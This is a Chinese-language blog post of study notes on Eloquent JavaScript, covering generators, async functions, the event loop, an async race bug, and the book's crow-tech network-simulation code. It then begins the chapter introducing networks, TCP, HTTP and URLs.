<p>当你用<code>function*</code>定义函数的时候（在关键字function后添加一个*），它就变成了一个generator。当你调用一个generator的时候，它返回一个iterator，我们在第六章已经说明过。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">powers</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> current = n;; current *= n) &#123;</span><br><span class="line">    <span class="keyword">yield</span> current;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> power <span class="keyword">of</span> powers(<span class="number">3</span>)) &#123;</span><br><span class="line">  <span class="keyword">if</span>(power &gt; <span class="number">50</span>) <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(power);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// -&gt; 3</span></span><br><span class="line"><span class="comment">// -&gt; 9</span></span><br><span class="line"><span class="comment">// -&gt; 27</span></span><br></pre></td></tr></table></figure>

<p>初始情况下，当你调用<code>powers</code>的时候，这个函数开始被冻结。每一次在iterator上调用<code>next</code>的时候，函数运行直到遇见一个<code>yield</code>表达式，暂停并导致<code>yield</code>的值成为iterator下一个产生的值。当函数返回的时候（例子中并没有返回），iterator结束。</p>
<p>当使用generator函数时更容易书写iterator。<code>Group</code>类的iterator（第六章练习）可以用这个generator来写。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Group.prototype[<span class="built_in">Symbol</span>.iterator] = <span class="function"><span class="keyword">function</span>*(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.members.length; i++) &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">this</span>.members[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不再需要创建一个对象来保存迭代状态了，generators每一次yield的时候自动保存他们的局部状态。</p>
<p>这样的yield表达式只会直接出现在generator函数本身中，而不会在你在其内部定义的函数。当yield的时候，generator保存的状态只是它的局部环境和yield的位置。</p>
<p>一个<code>async</code>函数是一种特殊类型的generator。当调用的时候产出一个promise， 当返回（完成）的时候被resolve，当抛出异常的时候reject。无论什么时候它yield（await）一个promise，那个promise（值或者抛出的异常）的结果就是<code>await</code>表达式的结果。</p>
<h2 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h2><p>异步程序是一块接一块执行的。当行动结束或者失败时每一块都可能开始执行一些行为和schedule代码。在这些块之间，程序处于空闲状态，等待下一次行动。</p>
<p>所以回调并没有被schedule他们的代码直接调用。如果我在一个函数内部调用<code>setTimeout</code>，直到回调函数调用时，那个函数可能已经返回了。当回调返回的时候，控制并没有回到调用它的那个函数。</p>
<p>异步行为发生在它自己的空的函数调用栈。这是没有promise时，在异步代码间管理异常困难的原因之一。因为每一个回调开始于一个空的栈，你的<code>catch</code>处理程序将不会在它们抛出异常的那个栈。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Woosh"</span>);</span><br><span class="line">  &#125;, <span class="number">20</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (_) &#123;</span><br><span class="line">  <span class="comment">// This will not run</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Caught"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不管事件有多密集地发生，如超时或者到来的请求事件，一个JS环境一次只能运行一个程序。你可以将这个想象为在整个程序运行一个大的循环，叫做事件循环。当没有事情要做的时候，那个循环就停止了。但是随着事件不断来临，它们被添加到队列中，并且他们的代码一个挨一个的执行。因为不可能有两件事情同时运行，执行慢的代码可能延迟其他事件的处理。</p>
<p>这个例子设置了一个超时，但是一直拖到超时的预定时间点之后，导致超时延迟。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Timeout ran at"</span>, <span class="built_in">Date</span>.now() - start);</span><br><span class="line">&#125;, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">Date</span>.now() &lt; start + <span class="number">50</span>) &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Wasted time until"</span>, <span class="built_in">Date</span>.now() - start);</span><br><span class="line"><span class="comment">// → Wasted time until 50</span></span><br><span class="line"><span class="comment">// → Timeout ran at 55</span></span><br></pre></td></tr></table></figure>
<p>promise总是作为一个新事件resolve或者reject。即便一个promise已经resolve了，等待它将会导致你的回调在当前脚本完成之后运行，而不是立刻运行。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve(<span class="string">"Done"</span>).then(<span class="built_in">console</span>.log);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Me first"</span>);</span><br><span class="line"><span class="comment">// -&gt; Me first</span></span><br><span class="line"><span class="comment">// -&gt; Done</span></span><br></pre></td></tr></table></figure>

<p>在之后的章节里，我们将会看到运行在事件循环上的各种各样类型的其他事件。</p>
<h2 id="异步bug"><a href="#异步bug" class="headerlink" title="异步bug"></a>异步bug</h2><p>当你的程序同步运行的时候，再一次运行中，除了那些程序所做的状态改变没有其他的状态改变。对于异步程序，这是不同的，它们可能在执行过程中有其他代码可以运行的间隙。</p>
<p>让我们看个例子。我们的乌鸦的兴趣之一就是查每年在村子里孵化小鸡的数量。巢穴在让门的存储灯泡中储存这个数量。下面的代码尝试从给定年份所有的巢穴中枚举这个数量。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">anyStorage</span>(<span class="params">nest, source, name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (source == nest.name) <span class="keyword">return</span> storage(nest, name);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> routeRequest(nest, source, <span class="string">"storage"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">chicks</span>(<span class="params">nest, year</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> list = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">await</span> <span class="built_in">Promise</span>.all(network(nest).map(<span class="keyword">async</span> name =&gt; &#123;</span><br><span class="line">    list += <span class="string">`<span class="subst">$&#123;name&#125;</span>: <span class="subst">$&#123;</span></span></span><br><span class="line"><span class="string"><span class="subst">      <span class="keyword">await</span> anyStorage(nest, name, <span class="string">`chicks in <span class="subst">$&#123;year&#125;</span>`</span>)</span></span></span><br><span class="line"><span class="string"><span class="subst">    &#125;</span>\n`</span>;</span><br><span class="line">  &#125;));</span><br><span class="line">  <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>async name =&gt;</code>部分说明可以在箭头函数前面加<code>async</code>来使得其成为async的函数。</p>
<p>这段代码乍一看没有可疑之处…它在巢穴集合上映射<code>async</code>函数，创造了一个promise数组，并且在返回构建的list之前用<code>Promise.all</code>等待他们中的所有resolve或是reject。</p>
<p>但是确实有严重的错误。他将总是返回一个单行的输出，列出最慢响应的巢穴。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">chicks(bigOak, <span class="number">2017</span>).then(<span class="built_in">console</span>.log);</span><br></pre></td></tr></table></figure>
<p>你能发现原因吗？</p>
<p>问题就是<code>+=</code>操作符，接收语句开始执行时候的list的当前值，然后再await完成的时候，将list绑定设置为加上added字符串的值。</p>
<p>但是在语句开始的时间和完成的时间有一个异步的空子。这个<code>map</code>表达式在任何东西被添加到列表之前运行，所以每一个<code>+=</code>操作符开始于一个空字符串并且当存储解锁完成终止，将<code>list</code>设置为一个单行的list——添加这一行到空字符串的结果。</p>
<p>这通过从映射的promise返回一行和在<code>Promise.all</code>的结果上调用<code>join</code>可以很容易地避免，而不是通过改变绑定来构建列表。像往常一样，计算新值比起改变存在的值更不宜产生错误。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">chicks</span>(<span class="params">nest, year</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> lines = network(nest).map(<span class="keyword">async</span> name =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">": "</span> +</span><br><span class="line">      <span class="keyword">await</span> anyStorage(nest, name, <span class="string">`chicks in <span class="subst">$&#123;year&#125;</span>`</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">await</span> <span class="built_in">Promise</span>.all(lines)).join(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>类似这样的错误容易制造，尤其是使用<code>await</code>的时候，你应该意识到你的代码中哪里有gap存在。一个JS明确异步性（不管是通过回调，promise还是await）的好处就是识别这些gap相对容易。</p>
<h2 id="附录：crow-tech代码"><a href="#附录：crow-tech代码" class="headerlink" title="附录：crow-tech代码"></a>附录：crow-tech代码</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 仍然以from-to的形式指明图结构</span></span><br><span class="line">  <span class="keyword">const</span> connections = [</span><br><span class="line">    <span class="string">"Church Tower-Sportsgrounds"</span>, <span class="string">"Church Tower-Big Maple"</span>, <span class="string">"Big Maple-Sportsgrounds"</span>,</span><br><span class="line">    <span class="string">"Big Maple-Woods"</span>, <span class="string">"Big Maple-Fabienne's Garden"</span>, <span class="string">"Fabienne's Garden-Woods"</span>,</span><br><span class="line">    <span class="string">"Fabienne's Garden-Cow Pasture"</span>, <span class="string">"Cow Pasture-Big Oak"</span>, <span class="string">"Big Oak-Butcher Shop"</span>,</span><br><span class="line">    <span class="string">"Butcher Shop-Tall Poplar"</span>, <span class="string">"Tall Poplar-Sportsgrounds"</span>, <span class="string">"Tall Poplar-Chateau"</span>,</span><br><span class="line">    <span class="string">"Chateau-Great Pine"</span>, <span class="string">"Great Pine-Jacques' Farm"</span>, <span class="string">"Jacques' Farm-Hawthorn"</span>,</span><br><span class="line">    <span class="string">"Great Pine-Hawthorn"</span>, <span class="string">"Hawthorn-Gilles' Garden"</span>, <span class="string">"Great Pine-Gilles' Garden"</span>,</span><br><span class="line">    <span class="string">"Gilles' Garden-Big Oak"</span>, <span class="string">"Gilles' Garden-Butcher Shop"</span>, <span class="string">"Chateau-Butcher Shop"</span></span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  <span class="comment">//storageFor返回一个和给定name对象存储相关的对象。键为字符串，值为json字符串（对于值为数组或者对象方便我们处理）</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">storageFor</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> storage = <span class="built_in">Object</span>.create(<span class="literal">null</span>)</span><br><span class="line">    storage[<span class="string">"food caches"</span>] = [<span class="string">"cache in the oak"</span>, <span class="string">"cache in the meadow"</span>, <span class="string">"cache under the hedge"</span>]</span><br><span class="line">    storage[<span class="string">"cache in the oak"</span>] = <span class="string">"A hollow above the third big branch from the bottom. Several pieces of bread and a pile of acorns."</span></span><br><span class="line">    storage[<span class="string">"cache in the meadow"</span>] = <span class="string">"Buried below the patch of nettles (south side). A dead snake."</span></span><br><span class="line">    storage[<span class="string">"cache under the hedge"</span>] = <span class="string">"Middle of the hedge at Gilles' garden. Marked with a forked twig. Two bottles of beer."</span></span><br><span class="line">    storage[<span class="string">"enemies"</span>] = [<span class="string">"Farmer Jacques' dog"</span>, <span class="string">"The butcher"</span>, <span class="string">"That one-legged jackdaw"</span>, <span class="string">"The boy with the airgun"</span>]</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">"Church Tower"</span> || name == <span class="string">"Hawthorn"</span> || name == <span class="string">"Chateau"</span>)</span><br><span class="line">      storage[<span class="string">"events on 2017-12-21"</span>] = <span class="string">"Deep snow. Butcher's garbage can fell over. We chased off the ravens from Saint-Vulbas."</span></span><br><span class="line">    <span class="keyword">let</span> hash = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; name.length; i++) hash += name.charCodeAt(i)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> y = <span class="number">1985</span>; y &lt;= <span class="number">2018</span>; y++) &#123;</span><br><span class="line">      storage[<span class="string">`chicks in <span class="subst">$&#123;y&#125;</span>`</span>] = hash % <span class="number">6</span></span><br><span class="line">      hash = <span class="built_in">Math</span>.abs((hash &lt;&lt; <span class="number">2</span>) ^ (hash + y))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">"Big Oak"</span>) storage.scalpel = <span class="string">"Gilles' Garden"</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="string">"Gilles' Garden"</span>) storage.scalpel = <span class="string">"Woods"</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="string">"Woods"</span>) storage.scalpel = <span class="string">"Chateau"</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="string">"Chateau"</span> || name == <span class="string">"Butcher Shop"</span>) storage.scalpel = <span class="string">"Butcher Shop"</span></span><br><span class="line">    <span class="keyword">else</span> storage.scalpel = <span class="string">"Big Oak"</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> prop <span class="keyword">of</span> <span class="built_in">Object</span>.keys(storage)) storage[prop] = <span class="built_in">JSON</span>.stringify(storage[prop])</span><br><span class="line">    <span class="keyword">return</span> storage</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Network</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(connections, storageFor) &#123;</span><br><span class="line">      <span class="comment">// reachable包含图拓扑，为一个对象，键为巢穴名字，值为邻居巢穴字符串数组</span></span><br><span class="line">      <span class="keyword">let</span> reachable = <span class="built_in">Object</span>.create(<span class="literal">null</span>)</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> [<span class="keyword">from</span>, to] <span class="keyword">of</span> connections.map(<span class="function"><span class="params">conn</span> =&gt;</span> conn.split(<span class="string">"-"</span>))) &#123;</span><br><span class="line">        ;(reachable[<span class="keyword">from</span>] || (reachable[<span class="keyword">from</span>] = [])).push(to)</span><br><span class="line">        ;(reachable[to] || (reachable[to] = [])).push(<span class="keyword">from</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 创建的network实例有一个nodes对象，键为网络节点名字，值为node实例对象</span></span><br><span class="line">      <span class="keyword">this</span>.nodes = <span class="built_in">Object</span>.create(<span class="literal">null</span>)</span><br><span class="line">      <span class="comment">// Object.keys只返回对象本身的键</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> name <span class="keyword">of</span> <span class="built_in">Object</span>.keys(reachable))</span><br><span class="line">        <span class="comment">// 传入当前处理节点名字，邻居巢穴字符串数组， 网络实例和对应name的存储相关对象</span></span><br><span class="line">        <span class="keyword">this</span>.nodes[name] = <span class="keyword">new</span> Node(name, reachable[name], <span class="keyword">this</span>, storageFor(name))</span><br><span class="line">      <span class="keyword">this</span>.types = <span class="built_in">Object</span>.create(<span class="literal">null</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义请求类型，接收节点名字，和一个处理函数</span></span><br><span class="line">    defineRequestType(name, handler) &#123;</span><br><span class="line">      <span class="keyword">this</span>.types[name] = handler</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对于网络实例中的nodes对象，在其上调用同一个函数</span></span><br><span class="line">    everywhere(f) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> node <span class="keyword">of</span> <span class="built_in">Object</span>.values(<span class="keyword">this</span>.nodes)) f(node)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 后面用symbol作键</span></span><br><span class="line">  <span class="keyword">const</span> $storage = <span class="built_in">Symbol</span>(<span class="string">"storage"</span>), $network = <span class="built_in">Symbol</span>(<span class="string">"network"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如是null或者undefined，则返回null，否则将值变为JSON字符串再进行解析，原因暂时还不清楚（19.1.13）？</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">ser</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value == <span class="literal">null</span> ? <span class="literal">null</span> : <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(value))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 每个节点包含名字，邻居，网络，状态和存储相关属性</span></span><br><span class="line">    <span class="keyword">constructor</span>(name, neighbors, network, storage) &#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name</span><br><span class="line">      <span class="keyword">this</span>.neighbors = neighbors</span><br><span class="line">      <span class="keyword">this</span>[$network] = network</span><br><span class="line">      <span class="keyword">this</span>.state = <span class="built_in">Object</span>.create(<span class="literal">null</span>)</span><br><span class="line">      <span class="keyword">this</span>[$storage] = storage</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向其他节点发送消息，参数包括终点节点，消息类型，消息内容以及回调函数</span></span><br><span class="line">    send(to, type, message, callback) &#123;</span><br><span class="line">      <span class="comment">// 获取终点节点实例</span></span><br><span class="line">      <span class="keyword">let</span> toNode = <span class="keyword">this</span>[$network].nodes[to]</span><br><span class="line">      <span class="comment">// 不存在这个节点或者不是直接邻居节点，那么结束函数，并传递error到回调函数，参数为一个说明性的字符串</span></span><br><span class="line">      <span class="keyword">if</span> (!toNode || !<span class="keyword">this</span>.neighbors.includes(to))</span><br><span class="line">        <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">`<span class="subst">$&#123;to&#125;</span> is not reachable from <span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span>`</span>))</span><br><span class="line">      <span class="comment">// 是邻居节点我们获取到这种类型消息的处理函数（handler）</span></span><br><span class="line">      <span class="keyword">let</span> handler = <span class="keyword">this</span>[$network].types[type]</span><br><span class="line">      <span class="comment">// 如果没有注册这种消息类型，我们结束函数，传递未知请求类型错误到回调</span></span><br><span class="line">      <span class="keyword">if</span> (!handler)</span><br><span class="line">        <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Unknown request type "</span> + type))</span><br><span class="line">      <span class="comment">// 有这种消息类型，有3%概率发送失败</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">Math</span>.random() &gt; <span class="number">0.03</span>) setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          handler(toNode, ser(message), <span class="keyword">this</span>.name, (error, response) =&gt; &#123;</span><br><span class="line">            setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> callback(error, ser(response)), <span class="number">10</span>)</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          callback(e)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, <span class="number">10</span> * <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">10</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取该节点中storage的属性，并在获取JSON字符串值后将其解析为JS常规值传入回调函数，当要读取的属性不存在时，将其传入回调，若存在（不为undefined，则因其存储为JSON字符串，需要解析后传入回调函数）。</span></span><br><span class="line">    readStorage(name, callback) &#123;</span><br><span class="line">      <span class="keyword">let</span> value = <span class="keyword">this</span>[$storage][name]</span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> callback(value &amp;&amp; <span class="built_in">JSON</span>.parse(value)), <span class="number">20</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接将键值对写入$storage属性对象，注意值要存入JSON字符串形式，然后空参调用回调</span></span><br><span class="line">    writeStorage(name, value, callback) &#123;</span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>[$storage][name] = <span class="built_in">JSON</span>.stringify(value)</span><br><span class="line">        callback()</span><br><span class="line">      &#125;, <span class="number">20</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 构建一个网络对象，传入connections数组以及storageFor函数</span></span><br><span class="line">  <span class="keyword">let</span> network = <span class="keyword">new</span> Network(connections, storageFor)</span><br><span class="line">  <span class="comment">// 对外暴露三个接口，bigOak表示bigOak节点实例</span></span><br><span class="line">  exports.bigOak = network.nodes[<span class="string">"Big Oak"</span>]</span><br><span class="line">  <span class="comment">// 将network绑定到everywhere函数中的this</span></span><br><span class="line">  exports.everywhere = network.everywhere.bind(network)</span><br><span class="line">  <span class="comment">// 将defineRequestType中的this绑定到该network实例</span></span><br><span class="line">  exports.defineRequestType = network.defineRequestType.bind(network)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> __sandbox != <span class="string">"undefined"</span>) &#123;</span><br><span class="line">    __sandbox.handleDeps = <span class="literal">false</span></span><br><span class="line">    __sandbox.notify.onLoad = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// Kludge to make sure some functions are delayed until the</span></span><br><span class="line">      <span class="comment">// nodes have been running for 500ms, to give them a chance to</span></span><br><span class="line">      <span class="comment">// propagate network information.</span></span><br><span class="line">      <span class="keyword">let</span> waitFor = <span class="built_in">Date</span>.now() + <span class="number">500</span></span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">wrapWaiting</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">let</span> wait = waitFor - <span class="built_in">Date</span>.now()</span><br><span class="line">          <span class="keyword">if</span> (wait &lt;= <span class="number">0</span>) <span class="keyword">return</span> f(...args)</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">ok</span> =&gt;</span> setTimeout(ok, wait)).then(<span class="function"><span class="params">()</span> =&gt;</span> f(...args))</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> n <span class="keyword">of</span> [<span class="string">"routeRequest"</span>, <span class="string">"findInStorage"</span>, <span class="string">"chicks"</span>])</span><br><span class="line">        <span class="built_in">window</span>[n] = wrapWaiting(<span class="built_in">window</span>[n])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span> != <span class="string">"undefined"</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.require = <span class="function"><span class="params">name</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (name != <span class="string">"./crow-tech"</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Crow nests can only require \"./crow-tech\""</span>)</span><br><span class="line">      <span class="keyword">return</span> exports</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">module</span> != <span class="string">"undefined"</span> &amp;&amp; <span class="built_in">module</span>.exports) &#123;</span><br><span class="line">    <span class="built_in">module</span>.exports = exports</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>EJ13</title>
    <url>/2019/01/14/EJ13/</url>
    <content><![CDATA[<h1 id="JavaScript和浏览器"><a href="#JavaScript和浏览器" class="headerlink" title="JavaScript和浏览器"></a>JavaScript和浏览器</h1><p>这本书的下一张将会讨论web浏览器。没有web浏览器，就不会有JS。或者即使有，也没有人会关注它。</p>
<p>web技术从一开始就是分散的，不仅在技术上，它发展的方式也是一样。各种浏览器厂商都以一些特别的、有时考虑不周的方式添加了新功能，这些功能有时会被其他厂商采用，并最终以标准的形式确定下来。</p>
<p>这既是一种祝福，也是一种诅咒。一方面，它允许没有中央方控制一个系统，而是由各方在松散的协作(或偶尔公开的敌对状态下)下进行改进。另一方面，Web开发的随意方式意味着最终的系统并不是内部一致性的光辉典范。它的某些部分完全令人困惑，构思拙劣。</p>
<a id="more"></a>

<h2 id="网络和Internet"><a href="#网络和Internet" class="headerlink" title="网络和Internet"></a>网络和Internet</h2><p>计算机网络早在20世纪50年代就出现了。如果你在两个或者多个计算机间放置电缆并且允许它们来回通过这些电缆发送数据，你就可以做各种各样精彩的事情。</p>
<p>如果连接在一栋大楼里面的两个计算机允许我们做精彩的事，那么将整个星球的计算机互联会更棒。开始实现这个愿景的技术在20世纪80年代被开发出来，最终导致的网络被叫做Internet。它没有辜负它的诺言。</p>
<p>一台计算机可以向另外的计算机发送bit。为了从这种bit-shooting模式中产生高效的通信，双方计算机必须知道bit应该代表什么。任何给定序列的bit的含义完全取决于要表达的东西以及使用的编码机制。</p>
<p>一个网络协议描述了一种通过网络通信的方式。有发送电子邮件，收电子邮件，共享文件，甚至是控制那些刚好被恶意软件感染的计算机的各种各样的协议。</p>
<p>例如，超文本传输协议（HTTP)就是一个用于检索命名资源（一块信息，例如网页或者图片）的协议。它指定发起请求的一方应该像下面这样开始一个请求，指定资源名字和要使用的协议版本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>

<p>关于请求方在请求中包含更多信息的方式和接收方打包返回内容的方式有各种各样的规则。我们将在18章深入学习HTTP。</p>
<p>大多数的协议在其他协议之上构建。HTTP将网络看作类似流一样的设备，你可以将bit放入其中，并且让他们以正确的顺序到达正确的终点。如同我们在11章看到的那样，确保这些并不是容易的事。</p>
<p>传输控制协议（TCP）是一个解决这个问题的协议。所有联网的设备使用这种协议，并且大多数的互联网通信都构建在这种协议之上。</p>
<p>一个TCP连接像下面这样工作：一台计算机必须等待，或者监听其他计算机来发起通信。为了能够在一台计算机上同时监听不同种类的通讯，每一个监听器关联一个数字（端口号）。大多数的协议指定默认端口号。例如，当我们想要使用SMTP发送邮件的时候，我们发送电子邮件的计算机将监听25端口。</p>
<p>另一台计算机然后就可以通过用正确的端口号连接到目标计算机来建立连接。如果目标机器可达并且正在监听那个端口，连接就成功创建了。监听的计算机叫做服务器，而发起连接的计算机叫做客户端。</p>
<p>这样的连接表现的就像可以flow bit的双向管道——彼此都可以向上面发送数据。一旦bit发送成功，它们就可以再次在另一端读取。这是一个方便的模型。你可以说TCP提供了网络的抽象。</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>万维网（不要和作为整体的Internet搞混）是一组允许我们在浏览器中访问网页的一组协议和格式。名称中的web指的是这样的网页可以很容易的连接到彼此，因此连接成了用户可以在其中移动的巨大网格。</p>
<p>为了成为万维网的一部分，你需要做的就是将一台机器连接到互联网，并让它用HTTP协议监听80端口，这样其他计算机就可以向它索要文档。</p>
<p>每一个web上的文档都以统一资源定位符（URL）命名，看起来像这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eloquentjavascript.net&#x2F;13_browser.html</span><br><span class="line">|     |                      |               |</span><br><span class="line">protocol       server               path</span><br></pre></td></tr></table></figure>
<p>第一部分告诉我们这个URL使用了HTTP协议（对比加密的HTTP，应该是https://）。然后是我们要请求的文档来自哪个server。最后是标识我们感兴趣的特定文档（或者资源）的路径字符串。</p>
<p>连接到互联网的计算机得到一个IP地址，是一个可用于发送消息到该计算机的数字，看起来像这样<code>149.210.142.219</code>或者<code>2001:4860:4860::8888</code>。但是或多或少的随机数列表很难记忆并且不容易输入，所以你可以为一个特定地址或者一个地址集合注册一个域名。我注册了<em>eloquentjavascript.net</em>这个域名指向我控制的计算机的IP地址并且因此可以使用这个域名来提供网页。</p>
<p>如果你将URL输入浏览器的地址栏，浏览器将尝试检索并显示那个URL地址的文档。首先，你的浏览器必须找到地址<em>eloquentjavascript.net*指向的地址。然后，使用HTTP协议，将会向那个地址的服务器请求一个连接并请求资源</em>/13_browser.html*。如果一切顺利，服务器发送回来一个文档，浏览器将其显示在屏幕上。</p>
